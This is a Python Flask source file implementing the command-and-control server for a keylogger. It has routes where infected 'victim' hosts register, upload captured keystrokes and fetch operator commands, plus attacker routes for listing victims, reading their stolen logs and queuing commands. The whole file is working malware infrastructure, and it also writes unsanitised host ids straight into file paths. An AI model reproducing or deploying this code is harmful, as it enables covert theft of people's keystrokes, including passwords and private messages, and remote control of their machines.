from flask import Flask, render_template, request
import os
import re
from urllib.parse import unquote

app = Flask(__name__)

def decode_keystrokes(data):
    # Clean raw string
    data = data.replace('\x10', '')  # Remove control char

    # Replace known key patterns with readable form
    special_keys = re.findall(r'%91(.*?)%93', data)
    for key in special_keys:
        data = data.replace(f'%91{key}%93', f'[{key}]')

    # Optionally decode %-encoded values (e.g., %-96)
    data = re.sub(r'%(-?\d+)', lambda m: chr(int(m.group(1))), data)

    return data

@app.route('/')
def hello_world():
    return render_template("test.html")

# Attacker routes
@app.route('/clients', methods=['GET'])
def get_clients():
    current_dir = os.getcwd()
    try:
        # Return all hosts in the hosts.txt file
        with open(f"{current_dir}/hosts.txt", "r") as f:
            data = f.read()
            return data.replace("\n", "<br>")
    except:
        return "Unable to grab client lists. Please try again later."

@app.route('/logs', methods=['GET'])
def get_logs():
    host_id = request.args["id"]
    current_dir = os.getcwd()
    try:
        # Return all logs for host if they have a file
        if os.path.isfile(f"{current_dir}/{host_id}.txt"):
            with open(f"{current_dir}/{host_id}.txt", "r") as f:
                data = f.read()
                return data.replace("\n", "<br>")
    except:
        return "Unable to grab client logs. Please try again later."

@app.route('/commands', methods=['GET'])
def get_commands():
    return render_template("commands.html")

@app.route('/commands', methods=['POST'])
def set_commands():
    current_dir = os.getcwd()
    host_id = request.form["hostid"]
    host_command = request.form["hostcommand"]
    try:
        with open(f"{current_dir}/{host_id}-C2.txt", "w") as f:
            f.write(host_command)
        return("Commands saved.")
    except:
        print("Unable to save host command to file,")
        return("Failed to save command. Please try again later.")


# Client routes
@app.route('/register', methods=['GET'])
def register():
    host_id = request.args["id"]
    current_dir = os.getcwd()
    try:
        # We only register if client does not yet have a file
        if os.path.isfile(f"{current_dir}/{host_id}.txt"):
            return("Host already registered")
        else:
            # Create log file for victim
            with open(f"{current_dir}/{host_id}.txt", "a") as f:
                print("New victim!")
            # Add victim to known hosts.txt
            with open(f"{current_dir}/hosts.txt", "a") as f:
                f.write(f"{host_id}\n")
            return "Client registered"
    except:
        print("Unable to register victim")

@app.route('/command', methods=['GET'])
def get_command():
    id = request.args["id"]
    current_dir = os.getcwd()
    file_name = f"{current_dir}/{id}-C2.txt"
    try:
        with open(file_name, "r") as f:
            command = f.read()
        os.remove(file_name)
        return command

    except:
        return("No commands found.")


@app.route('/upload', methods=['GET'])
def upload_data():
    print("Logs incoming!")
    host_id = request.args["id"]
    host_data = request.args["data"]
    current_dir = os.getcwd()
    try:
        with open(f"{current_dir}/{host_id}.txt", "a") as f:
            f.write(f"{decode_keystrokes(host_data)}\n")
            return "Success"
    except:
        return "Failed to save data."


if __name__ == '__main__':
    app.run(host="0.0.0.0", port="8080")